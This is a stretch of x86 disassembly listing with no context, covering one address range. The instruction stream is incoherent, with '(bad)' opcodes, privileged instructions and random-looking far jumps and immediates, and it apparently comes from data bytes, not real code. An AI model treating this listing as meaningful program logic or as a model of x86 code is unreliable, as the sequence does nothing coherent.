  41f713:	sbb    al,BYTE PTR [edx]
  41f715:	mov    esi,0x295c1548
  41f71a:	dec    ebp
  41f71b:	jae    0x41f781
  41f71d:	sub    ebp,DWORD PTR [eax+edx*4+0x370d6769]
  41f724:	xchg   esp,eax
  41f725:	mov    bh,0x6f
  41f727:	gs sti 
  41f729:	mov    bl,0x2b
  41f72b:	imul   esi,DWORD PTR [ebx],0xe8859a39
  41f731:	add    al,0xa
  41f733:	test   al,0xb8
  41f735:	dec    ebx
  41f736:	outs   dx,DWORD PTR ds:[esi]
  41f737:	and    BYTE PTR [ebx],0x9
  41f73a:	clc    
  41f73b:	jnp    0x41f744
  41f73d:	fiadd  WORD PTR [edx+0x48]
  41f740:	add    esp,esi
  41f742:	and    cl,BYTE PTR [esi+ebx*2+0x3dc86cc5]
  41f749:	int    0x91
  41f74b:	retf   0xbfa2
  41f74e:	jmp    0x4821:0x16450870
  41f755:	addr16 gs pop ss
  41f758:	sar    BYTE PTR [ebx-0x19f71a93],1
  41f75e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f75f:	sbb    eax,0x6f6aa5a2
  41f764:	jns    0x41f760
  41f766:	sub    DWORD PTR [ecx+0xb2fd38b],edi
  41f76c:	imul   esp,DWORD PTR [edi-0x47ae071d],0xfffffff5
  41f773:	ins    BYTE PTR es:[edi],dx
  41f774:	loop   0x41f7c2
  41f776:	add    DWORD PTR [edi-0x26a778c],eax
  41f77c:	lock adc BYTE PTR [edi],ah
  41f77f:	lods   eax,DWORD PTR ds:[esi]
  41f780:	icebp  
  41f781:	mov    dl,0x39
  41f783:	data16 fxch st(5)
  41f786:	mov    ebx,0x993f42ce
  41f78b:	ins    BYTE PTR es:[edi],dx
  41f78c:	sub    BYTE PTR [eax-0x364c1e34],ch
  41f792:	sub    ecx,DWORD PTR [ecx+0x4c]
  41f795:	dec    ebp
  41f796:	fcom   QWORD PTR [ecx]
  41f798:	cmp    dh,0x62
  41f79b:	jle    0x41f79f
  41f79d:	lahf   
  41f79e:	(bad)  
  41f7a0:	adc    DWORD PTR [edi-0x4b],esp
  41f7a3:	xchg   ebp,eax
  41f7a4:	mov    ah,0x5d
  41f7a6:	push   edx
  41f7a7:	or     DWORD PTR [esi],ecx
  41f7a9:	dec    edi
  41f7aa:	xchg   ebp,eax
  41f7ab:	jae    0x41f794
  41f7ad:	dec    edi
  41f7ae:	xor    al,BYTE PTR [ecx-0x3]
  41f7b1:	sbb    eax,0xd278b65a
  41f7b6:	retf   0x8b95
  41f7b9:	ret    0xaba7
  41f7bc:	pop    ds
  41f7bd:	adc    BYTE PTR [edi],al
  41f7bf:	fldenv [ebx]
  41f7c1:	mov    ebx,0x27243465
  41f7c6:	jmp    0x41f760
  41f7c8:	lods   eax,DWORD PTR ds:[esi]
  41f7c9:	gs imul esp,ecx,0x1af35951
  41f7d0:	dec    edx
  41f7d1:	sub    ecx,ebp
  41f7d3:	bound  ebp,QWORD PTR [esi-0x1a]
  41f7d6:	jge    0x41f7a4
  41f7d8:	pushf  
  41f7d9:	push   esi
  41f7da:	sbb    eax,0xffffffc7
  41f7dd:	sub    ebp,DWORD PTR [edx+0xa]
  41f7e0:	push   esp
  41f7e1:	icebp  
  41f7e2:	xchg   BYTE PTR [ebx-0x15],dh
  41f7e5:	ss push edx
  41f7e7:	jl     0x41f7c3
  41f7e9:	cmp    DWORD PTR cs:[eax],edi
  41f7ec:	iret   
  41f7ed:	outs   dx,DWORD PTR ds:[esi]
  41f7ee:	adc    al,0x4a
  41f7f0:	adc    ecx,DWORD PTR [esi+0x3812b81f]
  41f7f6:	stc    
  41f7f7:	sub    BYTE PTR [edx],0x69
  41f7fa:	arpl   WORD PTR [ecx+ebp*2+0x222c6a7a],dx
  41f801:	aad    0x39
  41f803:	setg   BYTE PTR [edx+0x45bc94f7]
  41f80a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f80b:	in     eax,dx
  41f80c:	mov    esi,ebx
  41f80e:	(bad)  
  41f80f:	es in  eax,dx
  41f811:	mov    esp,ebp
  41f813:	sub    esi,DWORD PTR [ebx+0x17cb0a07]
  41f819:	retf   0xb2ba
  41f81c:	aam    0x6a
  41f81e:	sub    ah,BYTE PTR [edi-0xff8f138]
  41f824:	ja     0x41f818
  41f826:	ret    
  41f827:	jno    0x41f899
  41f829:	into   
  41f82a:	jb     0x41f841
  41f82c:	jmp    0x41f894
  41f82e:	dec    esp
  41f82f:	sub    eax,0x1ca1acdf
  41f834:	mov    dl,0x51
  41f836:	call   0xcbd:0x83ba6b41
  41f83d:	pop    edx
  41f83e:	or     edi,0x38
  41f841:	pop    esp
  41f842:	ret    
  41f843:	out    dx,al
  41f844:	stos   BYTE PTR es:[edi],al
  41f845:	pop    edx
  41f846:	pop    ds
  41f847:	mov    ds:0x84f7e81f,al
  41f84c:	repz cwde 
  41f84e:	div    DWORD PTR [edx+0x38bec805]
  41f854:	rcr    edx,cl
  41f856:	mov    bl,BYTE PTR [edi-0x42519533]
  41f85c:	jecxz  0x41f859
  41f85e:	clc    
  41f85f:	dec    ecx
  41f860:	fwait
  41f861:	les    eax,FWORD PTR [esi+eax*8+0x418a07a5]
  41f868:	lds    eax,FWORD PTR [edi]
  41f86a:	test   BYTE PTR [eax+0x4d],0x98
  41f86e:	fsub   DWORD PTR [edi]
  41f870:	push   ebp
  41f871:	jb     0x41f8d2
  41f873:	xlat   BYTE PTR ds:[ebx]
  41f874:	inc    edi
  41f875:	jp     0x41f8e8
  41f877:	aam    0x92
  41f879:	sbb    DWORD PTR [esi],esp
  41f87b:	xor    DWORD PTR [esp+edi*4],0x525224d4
  41f882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f883:	sbb    DWORD PTR [ebp+eax*2-0x17],ebp
  41f887:	ins    BYTE PTR es:[edi],dx
  41f888:	jp     0x41f836
  41f88a:	ficomp WORD PTR [ecx+0x155cdce3]
  41f890:	mov    esp,0x811138a1
  41f895:	rol    BYTE PTR [edi-0x10c2722],0xa
  41f89c:	div    DWORD PTR [edx]
  41f89e:	(bad)  
  41f8a0:	mov    eax,0x7dd7b243
  41f8a5:	xchg   BYTE PTR [edi],dh
  41f8a7:	out    dx,eax
  41f8a8:	sub    ah,BYTE PTR [ecx]
  41f8aa:	pop    ss
  41f8ab:	sar    BYTE PTR [ebx],1
  41f8ad:	push   ecx
  41f8ae:	mov    bl,0x4e
  41f8b1:	imul   eax,DWORD PTR [esi+esi*8],0x2b2202f3
  41f8b8:	jg     0x41f91e
  41f8ba:	int    0xd3
  41f8bc:	mov    esi,0x7b17aa62
  41f8c1:	cwde   
  41f8c2:	sub    BYTE PTR [edx+eiz*2+0x70],ah
  41f8c6:	push   eax
  41f8c7:	push   0xffffff94
  41f8c9:	jno    0x41f8bf
  41f8cb:	int3   
  41f8cc:	cmp    edi,ebp
  41f8ce:	mov    bh,0x6b
  41f8d0:	ins    DWORD PTR es:[edi],dx
  41f8d1:	jl     0x41f94b
  41f8d3:	mov    cl,0xfe
  41f8d5:	fs pop esp
  41f8d7:	inc    esi
  41f8d8:	std    
  41f8d9:	out    dx,al
  41f8da:	push   ss
  41f8db:	test   BYTE PTR [edi],cl
  41f8dd:	push   es
  41f8de:	rol    BYTE PTR ds:0x1da7ae90,0xf6
  41f8e5:	mov    edx,0x6db6f838
  41f8ea:	enter  0xa2d4,0xbe
  41f8ee:	repz push ss
  41f8f0:	test   al,0x1f
  41f8f2:	aas    
  41f8f3:	sahf   
  41f8f4:	or     dh,dh
  41f8f6:	mov    edi,0x5bf2a397
  41f8fb:	inc    BYTE PTR [ecx]
  41f8fd:	std    
  41f8fe:	ins    BYTE PTR es:[edi],dx
  41f8ff:	loopne 0x41f8d1
  41f901:	sub    al,0x81
  41f903:	(bad)  [esi]
  41f905:	fsincos 
  41f907:	call   0x472015fa
  41f90c:	add    BYTE PTR fs:[ebx+ebx*8-0x4db16868],0xe0
  41f915:	shr    BYTE PTR [ecx+0x23f840fe],1
  41f91b:	jmp    0x41f900
  41f91d:	shr    BYTE PTR [eax*8-0xdc7a211],1
  41f924:	jns    0x41f99b
  41f926:	pop    ds
  41f927:	pop    ebp
  41f928:	or     eax,0xf7ccf2aa
  41f92d:	je     0x41f946
  41f92f:	ins    DWORD PTR es:[edi],dx
  41f930:	bound  edx,QWORD PTR ss:[esi+0x3ab84f88]
  41f937:	sbb    ebx,DWORD PTR [edx]
  41f939:	cmp    eax,0x50f651da
  41f93e:	push   edi
  41f93f:	fimul  DWORD PTR [ebx+0x2d5dd0e9]
  41f945:	sbb    edx,DWORD PTR [edi-0x57]
  41f948:	mov    esp,0x9d29063f
  41f94d:	test   eax,0x261a5db3
  41f952:	xchg   DWORD PTR ss:[esi],ecx
  41f955:	sub    DWORD PTR [edx-0x3e1b897c],ebx
  41f95b:	mov    cs,WORD PTR [esi]
  41f95d:	inc    BYTE PTR [eax]
  41f95f:	xchg   ebx,eax
  41f960:	inc    ebp
  41f961:	icebp  
  41f962:	sahf   
  41f963:	fdivr  QWORD PTR [eax+0x49c56d81]
  41f969:	ins    DWORD PTR es:[edi],dx
  41f96a:	lods   al,BYTE PTR ds:[esi]
  41f96b:	dec    edx
  41f96c:	in     al,dx
  41f96d:	js     0x41f9d1
  41f96f:	sub    BYTE PTR [edx-0x6a],ah
  41f972:	test   BYTE PTR [ebp-0x398d307a],cl
  41f978:	cmp    al,0xe6
  41f97a:	call   0x545086e7
  41f97f:	cli    
  41f980:	mov    al,ah
  41f982:	das    
  41f983:	ror    BYTE PTR [esi-0x14a0e940],0xd1
  41f98a:	sbb    al,0x5d
  41f98c:	arpl   WORD PTR [edx],dx
  41f98e:	mov    ebp,0xd827967d
  41f993:	test   BYTE PTR [eax],bl
  41f995:	jns    0x41f9a2
  41f997:	jnp    0x41f9e0
  41f999:	test   al,0x2a
  41f99b:	pop    ss
  41f99c:	cli    
  41f99d:	hlt    
  41f99e:	sbb    al,BYTE PTR [ebx-0x22]
  41f9a1:	ficom  DWORD PTR [ebx-0x29]
  41f9a4:	aaa    
  41f9a5:	test   al,0x3
  41f9a7:	and    ecx,ebx
  41f9a9:	cli    
  41f9aa:	hlt    
  41f9ab:	and    esp,DWORD PTR [ebp+0x4773da44]
  41f9b1:	sbb    DWORD PTR [ebx+0x6f],ecx
  41f9b4:	repnz mov edx,0x5d0ba019
  41f9ba:	arpl   WORD PTR ds:0xadf47c0c,bx
  41f9c0:	jge    0x41f9d7
  41f9c2:	xchg   ebp,eax
  41f9c3:	add    esi,DWORD PTR [ebp-0x548addaa]
  41f9c9:	mov    ds:0xea694d99,eax
  41f9ce:	inc    ebx
  41f9cf:	ficomp WORD PTR [esi+0x52438dca]
  41f9d5:	lods   al,BYTE PTR ds:[esi]
  41f9d6:	jl     0x41f9aa
  41f9d8:	xor    al,0x38
  41f9da:	inc    esi
  41f9db:	icebp  
  41f9dc:	in     al,0xcb
  41f9de:	clc    
  41f9df:	repnz mov al,ds:0xc111c5
	...
  41f9f1:	mov    edi,0x9c801c2f
  41f9f6:	mov    bl,0xbf
  41f9f8:	aas    
  41f9f9:	sysexit 
  41f9fb:	pop    ecx
  41f9fc:	push   ss
  41f9fd:	or     DWORD PTR [edi],esp
  41f9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa00:	(bad)  
  41fa01:	ins    DWORD PTR es:[edi],dx
  41fa02:	je     0x41fa05
  41fa04:	add    BYTE PTR [ebx+0x15000003],ch
  41fa0a:	rcr    eax,0xfa
  41fa0d:	mov    cl,0x9a
  41fa0f:	sbb    ah,0x6b
  41fa12:	(bad)
  41fa16:	loop   0x41fa29
  41fa18:	jmp    0xb8fac898
  41fa1d:	add    DWORD PTR [ebx+ebx*4],esp
  41fa20:	sub    eax,0xf00c563f
  41fa25:	and    BYTE PTR [ebx],ch
  41fa27:	iret   
  41fa28:	xchg   ebx,eax
  41fa29:	in     eax,0x1e
  41fa2b:	test   al,0xaa
  41fa2d:	and    edi,DWORD PTR [esp+ecx*2+0x20]
  41fa31:	lock rcr DWORD PTR [edi],cl
  41fa34:	push   ebp
  41fa35:	sub    eax,0x9b0c582b
  41fa3a:	or     DWORD PTR [ebx+0x7c953005],0xffffff88
  41fa41:	icebp  
  41fa42:	inc    eax
  41fa43:	jno    0x41fa78
  41fa45:	push   cs
  41fa46:	rcr    DWORD PTR [eax-0x2f3732dd],cl
  41fa4c:	jg     0x41fab6
  41fa4e:	ins    DWORD PTR es:[edi],dx
  41fa4f:	daa    
  41fa50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa51:	push   edx
  41fa52:	pop    ebp
  41fa53:	iret   
  41fa54:	jg     0x41fa0d
  41fa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa57:	adc    edx,DWORD PTR [esi+0x49a44d3b]
  41fa5d:	pushf  
  41fa5e:	cli    
  41fa5f:	mov    eax,0x3b80db17
  41fa64:	stos   DWORD PTR es:[edi],eax
  41fa65:	adc    eax,0xf18f636c
  41fa6a:	add    DWORD PTR [ecx+0x76],edi
  41fa6d:	test   al,0x19
  41fa6f:	inc    edi
  41fa70:	jne    0x41fa3f
  41fa72:	add    esi,ebx
  41fa74:	leave  
  41fa75:	ficom  WORD PTR [ebp+edi*8-0x566de9b4]
  41fa7c:	mov    ds:0xc2609b7,eax
  41fa81:	mov    eax,ds:0x9dd4ebbb
  41fa86:	push   ecx
  41fa87:	in     al,0x22
  41fa89:	xchg   ebp,edx
  41fa8b:	mov    ch,0xda
  41fa8d:	add    al,BYTE PTR [eax+0x38]
  41fa90:	dec    eax
  41fa91:	mov    bl,0xab
  41fa93:	cmp    BYTE PTR [edi+0x65],al
  41fa96:	call   0x5c421dd9
  41fa9b:	jg     0x41fab0
  41fa9d:	or     esi,DWORD PTR [ebx+0x52b6c06]
  41faa3:	pop    es
  41faa4:	fidiv  DWORD PTR [eax]
  41faa6:	and    dl,ch
  41faa8:	jge    0x41fad0
  41faaa:	pop    ebx
  41faab:	sbb    bh,dh
  41faad:	push   ecx
  41faae:	loopne 0x41fa5f
  41fab0:	das    
  41fab1:	cmp    ecx,ebp
  41fab3:	xchg   BYTE PTR [edx+0x67],ah
  41fab6:	enter  0x967d,0xd5
  41faba:	and    al,0x1e
  41fabc:	pop    edx
  41fabd:	jbe    0x41fb37
  41fabf:	pushf  
  41fac0:	fdiv   QWORD PTR [ecx]
  41fac2:	retf   0x61c9
  41fac5:	or     ecx,DWORD PTR [eax-0x166cdb5d]
  41facb:	sub    BYTE PTR [eax+0x56],al
  41face:	pop    eax
  41facf:	fisttp QWORD PTR [ecx+0x76]
  41fad2:	sbb    eax,0x3c7d53c7
  41fad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fad8:	es mov dl,0x7b
  41fadb:	push   DWORD PTR [esi]
  41fadd:	mov    DWORD PTR [ebx],edx
  41fadf:	add    BYTE PTR [esi],ah
  41fae1:	scas   eax,DWORD PTR es:[edi]
  41fae2:	adc    eax,0xa50c3f7e
  41fae7:	or     eax,0x938ee18a
  41faec:	xor    dh,BYTE PTR ds:0x515150a5
  41faf2:	jne    0x41fa9d
  41faf4:	add    BYTE PTR [esi-0x713a89a0],ch
  41fafa:	jecxz  0x41fa99
  41fafc:	lock inc eax
  41fafe:	rcl    DWORD PTR [edx],0x37
  41fb01:	add    al,0xc8
  41fb03:	arpl   WORD PTR [ecx],bp
  41fb05:	adc    eax,DWORD PTR [ecx+0x1bb1c963]
  41fb0b:	imul   ecx,DWORD PTR [edi],0x3e
  41fb0e:	lods   eax,DWORD PTR ds:[esi]
  41fb0f:	in     eax,dx
  41fb10:	(bad)  
  41fb11:	xchg   edi,eax
  41fb12:	test   eax,0x75b29710
  41fb17:	loopne 0x41fab2
  41fb19:	paddq  mm4,QWORD PTR [ecx]
  41fb1c:	pop    esi
  41fb1d:	adc    ah,BYTE PTR ds:0xa93a8f6b
  41fb23:	mov    dl,0xc8
  41fb25:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41fb27:	mov    ah,0x86
  41fb29:	imul   esi,eax,0x42
  41fb2c:	push   ebx
  41fb2d:	jo     0x41fab6
  41fb2f:	clc    
  41fb30:	mov    al,0x79
  41fb32:	or     edi,DWORD PTR [eax-0x4c]
  41fb35:	dec    esp
  41fb36:	dec    edi
  41fb37:	dec    edi
  41fb38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb39:	xor    DWORD PTR [ecx+ebp*8-0x5a],ecx
  41fb3d:	int3   
  41fb3e:	es sahf 
  41fb40:	xchg   edi,eax
  41fb41:	mov    edi,0xd51d2da3
  41fb46:	dec    eax
  41fb47:	lea    edi,[edi+0x2f]
  41fb4a:	mov    esi,DWORD PTR [ecx-0x3b6ca947]
  41fb50:	xchg   ecx,eax
  41fb51:	sub    eax,0x32113e89
  41fb56:	sbb    eax,0x5368e161
  41fb5b:	xchg   BYTE PTR [eax-0x4e029630],dh
  41fb61:	fcomp  QWORD PTR [edi]
  41fb63:	xor    al,0xd5
  41fb65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb66:	push   eax
  41fb67:	jg     0x41fb45
  41fb69:	jecxz  0x41fb42
  41fb6b:	imul   edx,edx,0xb376b660
  41fb71:	enter  0x2649,0x8c
  41fb75:	iret   
  41fb76:	push   0x54184cb0
  41fb7b:	dec    ebx
  41fb7c:	mov    edx,0x3463c521
  41fb81:	or     ecx,esi
  41fb83:	pop    ecx
  41fb84:	aas    
  41fb85:	add    DWORD PTR [ecx+edx*2-0x5ba42325],ebp
  41fb8c:	pop    edx
  41fb8d:	cmp    BYTE PTR [esi+0x77],dl
  41fb90:	dec    eax
  41fb91:	adc    DWORD PTR ds:0xf25dface,esp
  41fb97:	lods   al,BYTE PTR ds:[esi]
  41fb98:	fbld   TBYTE PTR [ebp+0x78]
  41fb9b:	stc    
  41fb9c:	fs test eax,ecx
  41fb9f:	fneni(8087 only) 
  41fba1:	imul   ebp,ebp,0x9ecc948f
  41fba7:	dec    ebp
  41fba8:	inc    ebp
  41fba9:	sub    eax,0xba0f7627
  41fbae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbaf:	mov    dl,0x37
  41fbb1:	mov    eax,DWORD PTR ds:0x82146bbe
  41fbb7:	pusha  
  41fbb8:	mov    esp,0x51f5059f
  41fbbd:	leave  
  41fbbe:	inc    DWORD PTR [ecx+0x6d]
  41fbc1:	xchg   edi,eax
  41fbc2:	xchg   ecx,eax
  41fbc3:	xor    DWORD PTR [ebp-0x2f],esp
  41fbc6:	push   ss
  41fbc7:	adc    ch,dh
  41fbc9:	mov    eax,0xa38e9650
  41fbce:	int3   
  41fbcf:	addr16 mov esp,0x90cbd6b5
  41fbd5:	mov    ecx,0x2761ce62
  41fbda:	push   ebp
  41fbdb:	mov    al,ds:0xd25ac3b6
  41fbe0:	pop    es
  41fbe1:	push   ebx
  41fbe2:	mov    DWORD PTR [esi-0x32383138],0x7d656e01
  41fbec:	rcr    BYTE PTR [eax-0x6c9cd54c],cl
  41fbf2:	mov    ebp,0x453ae1fb
  41fbf7:	shl    BYTE PTR ds:0x45827ce2,cl
  41fbfd:	mov    bl,0xab
  41fbff:	mov    esp,0xaca9ee1
  41fc04:	mov    ecx,0x399f88ee
  41fc09:	fisttp DWORD PTR [eax]
  41fc0b:	test   eax,0x214c6594
  41fc10:	ins    BYTE PTR es:[edi],dx
  41fc11:	jnp    0x41fbd0
  41fc13:	aas    
  41fc14:	pop    esp
  41fc15:	icebp  
  41fc16:	sub    ecx,esp
  41fc18:	stos   DWORD PTR es:[edi],eax
  41fc19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc1a:	aad    0x3f
  41fc1c:	adc    dl,dh
  41fc1e:	jmp    0x41fbc4
  41fc20:	sbb    esp,DWORD PTR ds:0xb0ce64ce
  41fc26:	xor    dh,BYTE PTR [edi-0x6dd1a74c]
  41fc2c:	hlt    
  41fc2d:	push   eax
  41fc2e:	jmp    0xdb10:0xc1d5bd65
  41fc35:	ins    DWORD PTR es:[edi],dx
  41fc36:	fucomp st(7)
  41fc38:	shl    DWORD PTR [esi-0x268fc47d],1
  41fc3e:	mov    esp,0x7f538553
  41fc43:	call   0x363d2839
  41fc48:	dec    ecx
  41fc49:	jge    0x41fc21
  41fc4b:	push   0xffffffc3
  41fc4d:	in     al,0xd2
  41fc4f:	test   DWORD PTR [esi-0x6635069e],ebx
  41fc55:	sub    edi,DWORD PTR [ebx+0x467cd4a]
  41fc5b:	cli    
  41fc5c:	xchg   ebx,eax
  41fc5d:	inc    edi
  41fc5e:	dec    ebp
  41fc5f:	inc    edx
  41fc60:	fisubr DWORD PTR [edi+0x316fbdc1]
  41fc66:	xchg   edi,eax
  41fc67:	jnp    0x41fcdb
  41fc69:	cmp    al,0x32
  41fc6b:	retf   
  41fc6c:	sub    eax,esp
  41fc6e:	gs add eax,0xa8e90fb
  41fc74:	dec    eax
  41fc75:	dec    eax
  41fc76:	push   ecx
  41fc77:	imul   eax,ebp,0xfffffff8
  41fc7a:	loope  0x41fcc6
  41fc7c:	pop    es
  41fc7d:	sub    BYTE PTR [esi+ecx*1+0x4],bh
  41fc81:	fs add eax,0x91c25d06
  41fc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc88:	ja     0x41fc37
  41fc8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc8b:	cmp    ebp,ecx
  41fc8d:	call   0x74166343
  41fc92:	mov    dl,0xb0
  41fc95:	sbb    esp,DWORD PTR [esi+0x4668d95d]
  41fc9b:	ins    BYTE PTR es:[edi],dx
  41fc9c:	sub    ebx,ebp
  41fc9e:	out    0x60,al
  41fca0:	call   0x85d4f392
  41fca5:	add    ebx,DWORD PTR [edx+0x1c30fa5a]
  41fcab:	int    0xcf
  41fcad:	in     al,0xf5
  41fcaf:	pop    edi
  41fcb0:	outs   dx,BYTE PTR ds:[esi]
  41fcb1:	xor    DWORD PTR [ebx-0x207ef165],ebx
  41fcb7:	loopne 0x41fcee
  41fcb9:	outs   dx,DWORD PTR ds:[esi]
  41fcba:	(bad)  
  41fcbb:	int3   
  41fcbc:	xor    DWORD PTR [eax-0x1e],edx
  41fcbf:	cmp    BYTE PTR [eax+0x40],dh
  41fcc2:	dec    edi
  41fcc3:	cli    
  41fcc4:	jno    0x41fc66
  41fcc6:	jecxz  0x41fd32
  41fcc8:	dec    eax
  41fcc9:	aad    0x5c
  41fccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fccc:	mov    edx,DWORD PTR [esi+0x6f]
  41fccf:	mov    ch,0xf1
  41fcd1:	addr16 repnz sub al,0x97
  41fcd5:	rcr    BYTE PTR [ebp+0x5f],1
  41fcd8:	packsswb mm0,mm7
  41fcdb:	addr16 jl 0x41fcf0
  41fcde:	enter  0x466,0xac
  41fce2:	out    dx,al
  41fce3:	xor    esp,edx
  41fce5:	xor    al,0x23
  41fce7:	sahf   
  41fce8:	mov    edx,0xbab434ce
  41fced:	jb     0x41fd5f
  41fcef:	aaa    
  41fcf0:	or     bh,BYTE PTR [esi+0x74]
  41fcf3:	or     eax,0xffc349b8
  41fcf8:	xchg   edi,eax
  41fcf9:	call   0x6adc:0xd8206ad7
  41fd00:	out    0xe2,eax
  41fd02:	pop    es
  41fd03:	fimul  WORD PTR [ebp+0x6678ebc7]
  41fd09:	adc    DWORD PTR [edi],edi
  41fd0b:	xchg   edx,eax
  41fd0c:	imul   ax,WORD PTR [ebx-0x27071a79],0x4c
  41fd14:	xor    al,0xc2
  41fd16:	sub    dh,ah
  41fd18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd1a:	add    DWORD PTR [ebp+0x4aa67ac9],esp
  41fd20:	ror    BYTE PTR [eax+0x40b6f9f4],1
  41fd26:	cwde   
  41fd27:	or     al,0x87
  41fd29:	leave  
  41fd2a:	pushf  
  41fd2b:	iret   
  41fd2c:	int3   
  41fd2d:	mov    bl,0x9d
  41fd2f:	div    BYTE PTR [esi-0x3aa68f99]
  41fd35:	xchg   ebx,eax
  41fd36:	jae    0x41fd30
  41fd38:	jae    0x41fd45
  41fd3a:	adc    BYTE PTR [ecx],ch
  41fd3c:	cmc    
  41fd3d:	inc    esi
  41fd3e:	into   
  41fd3f:	mov    ch,0x15
  41fd41:	pusha  
  41fd42:	mov    al,ds:0x4cad9109
  41fd47:	das    
  41fd48:	fsub   QWORD PTR [ecx+0x50]
  41fd4b:	cdq    
  41fd4c:	inc    ecx
  41fd4d:	mov    eax,0x6ae6e0fc
  41fd52:	sbb    dl,bh
  41fd54:	scas   al,BYTE PTR es:[edi]
  41fd55:	in     al,dx
  41fd56:	push   0xffffff84
  41fd58:	shr    BYTE PTR [edi+0x1ad282a5],0x72
  41fd5f:	fld    TBYTE PTR [ebx+0x52c0ef0a]
  41fd65:	cmc    
  41fd66:	mov    al,ds:0x63c30593
  41fd6b:	jmp    0xe430:0x7c9acfdb
  41fd72:	ss sbb al,0xae
  41fd75:	mov    ds:0xb70d707b,al
  41fd7a:	xor    dh,0xb5
  41fd7d:	cmp    eax,0x9176b1d6
  41fd82:	xchg   BYTE PTR [edi],bl
  41fd84:	xor    al,0x91
  41fd86:	into   
  41fd87:	sub    al,0xa9
  41fd89:	sbb    DWORD PTR [eax],eax
  41fd8b:	popf   
  41fd8c:	mov    WORD PTR [edx],?
  41fd8e:	mov    al,BYTE PTR [edx]
  41fd90:	shr    DWORD PTR [ebx+0x78],0xaa
  41fd94:	cmp    al,0x0
  41fd96:	or     DWORD PTR [ecx],edx
  41fd98:	add    BYTE PTR [edi],bh
  41fd9a:	js     0x41fdbc
  41fd9c:	jg     0x41fd1f
  41fd9e:	and    al,0x18
  41fda0:	in     al,0x8b
  41fda2:	test   al,0x68
  41fda4:	pop    ebx
  41fda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda6:	mov    al,ds:0x98113679
  41fdab:	mov    ah,0xef
  41fdad:	mov    edx,0xc0904ee
  41fdb2:	test   al,0x2f
	...
  41fdc0:	add    BYTE PTR [ecx-0x400c494c],cl
  41fdc6:	repz int 0xfe
  41fdc9:	push   ebp
  41fdca:	cmp    BYTE PTR [edx-0x7a],bl
  41fdcd:	jecxz  0x41fe03
  41fdcf:	jae    0x41fe4d
  41fdd1:	sbb    BYTE PTR [eax+0x1],bh
  41fdd4:	add    BYTE PTR [ebx-0x27fffffd],ch
  41fdda:	pop    ds
  41fddb:	pop    es
  41fddc:	xor    DWORD PTR [edx-0x44],eax
  41fddf:	mov    esi,0xb9034dd7
  41fde4:	pop    ebp
  41fde5:	mov    bh,0xb8
  41fde7:	inc    esi
  41fde8:	rcl    bh,1
  41fdea:	sar    DWORD PTR [eax+0x7533b44f],cl
  41fdf0:	(bad)  
  41fdf2:	lods   eax,DWORD PTR ds:[esi]
  41fdf3:	and    BYTE PTR [edi],0xa6
  41fdf6:	retf   
  41fdf7:	pop    esi
  41fdf8:	outs   dx,BYTE PTR ds:[esi]
  41fdf9:	jmp    0x41fd86
  41fdfb:	add    DWORD PTR [esi],ecx
  41fdfd:	add    BYTE PTR [ebx-0x74b0a1c6],0x43
  41fe04:	enter  0x7016,0xa3
  41fe08:	adc    DWORD PTR [ebp+ecx*8-0x62],ebp
  41fe0c:	sbb    BYTE PTR [eax+0x37fde7ce],0x7
  41fe13:	cmp    DWORD PTR [edi+0x64afb580],edi
  41fe19:	jbe    0x41fe28
  41fe1b:	dec    edx
  41fe1c:	inc    ebp
  41fe1d:	btr    DWORD PTR [ecx-0x35],ecx
  41fe21:	aas    
  41fe22:	mov    eax,0x99efeb85
  41fe27:	stos   DWORD PTR es:[edi],eax
  41fe28:	repnz addr16 xchg esi,eax
  41fe2b:	mov    DWORD PTR [edi+0x1cf6ed30],edi
  41fe31:	mov    ds:0xed624931,eax
  41fe36:	sahf   
  41fe37:	shl    DWORD PTR [ebx-0x70],cl
  41fe3a:	shl    bl,0x7a
  41fe3d:	mul    DWORD PTR [ebp+0xdc4c114]
  41fe43:	lods   eax,DWORD PTR ds:[esi]
  41fe44:	inc    edx
  41fe45:	adc    al,0x33
  41fe47:	in     al,0x56
  41fe49:	mov    ds,WORD PTR [edi+0x630241e0]
  41fe4f:	pushf  
  41fe50:	xchg   edx,eax
  41fe51:	and    ebx,DWORD PTR [ebx]
  41fe53:	enter  0x987f,0x8f
  41fe57:	lods   al,BYTE PTR ds:[esi]
  41fe58:	icebp  
  41fe59:	retf   0xfc4f
  41fe5c:	xchg   DWORD PTR [eax+0x5899460b],eax
  41fe62:	xor    ecx,DWORD PTR ds:0x46369f56
  41fe68:	or     eax,0x22e92d0f
  41fe6d:	imul   eax,DWORD PTR [ebp+0x38],0xffffffae
  41fe71:	mov    ecx,0xea3bab80
  41fe76:	mov    eax,ds:0xcb045f50
  41fe7b:	cs retf 
  41fe7d:	bound  edi,QWORD PTR [esi]
  41fe7f:	pushf  
  41fe80:	sar    BYTE PTR [edi+edi*2],0xc8
  41fe84:	adc    eax,0x48760413
  41fe89:	call   0x1930f34c
  41fe8e:	mov    cl,0x52
  41fe90:	stc    
  41fe91:	jbe    0x41fe92
  41fe93:	rcr    DWORD PTR [edx+0x2b897d17],0xc8
  41fe9a:	jo     0x41febe
  41fe9c:	retf   
  41fe9d:	js     0x41fe3f
  41fe9f:	or     cl,BYTE PTR [eax-0x87b2d2b]
  41fea5:	leave  
  41fea6:	stos   BYTE PTR es:[edi],al
  41fea7:	mov    cs,esp
  41fea9:	mov    ah,0x76
  41feab:	jb     0x41febb
